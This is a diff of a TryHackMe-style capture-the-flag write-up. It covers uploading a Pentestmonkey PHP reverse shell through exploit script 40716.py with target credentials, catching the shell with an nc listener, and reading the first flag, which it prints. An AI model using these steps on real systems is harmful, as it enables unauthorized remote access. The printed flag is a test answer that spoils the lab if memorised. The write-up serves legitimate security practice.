@@ -24,11 +24,13 @@ With this exploit, we will upload our reverse shell.
 Get the reverse shell from [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). 
 And edit the ip and port. To find your ip go to https://tryhackme.com/access. 
 (Note you need to change the extension from php to **php5**.
-```python3 40716.py
+```
+   python3 40716.py
    <target-ip>/content
    manager
    Password123
-   php-reverse-shell.php5 ```
+   php-reverse-shell.php5 
+ ```
  After running the command you will see the link to your upload. Before clicking on it run ```nc -lvnp <port-for-reverse-shell> ```
  
  Click on the link, you will get the reverse shell. Navigate to ```/home/itguy``` to find the first flag: **THM{63e5bce9271952aad1113b6f1ac28a07}**
